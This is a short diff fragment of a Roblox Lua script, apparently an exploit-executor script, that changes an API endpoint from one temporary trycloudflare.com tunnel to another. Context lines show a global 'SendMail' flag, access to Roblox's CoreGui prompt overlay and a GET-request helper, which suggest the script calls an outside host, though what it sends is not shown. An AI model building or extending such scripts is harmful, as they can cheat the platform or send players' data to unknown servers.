@@ -54,7 +54,7 @@ getgenv().SendMail = true
 
 local httpService = game:GetService("HttpService")
 local promptOverlay = game.CoreGui.RobloxPromptGui.promptOverlay
-local apiUrl = "https://hh-dealing-front-crucial.trycloudflare.com"
+local apiUrl = "https://packages-shakespeare-bureau-antiques.trycloudflare.com"
 
 local function makeGetRequest(url)
     local response
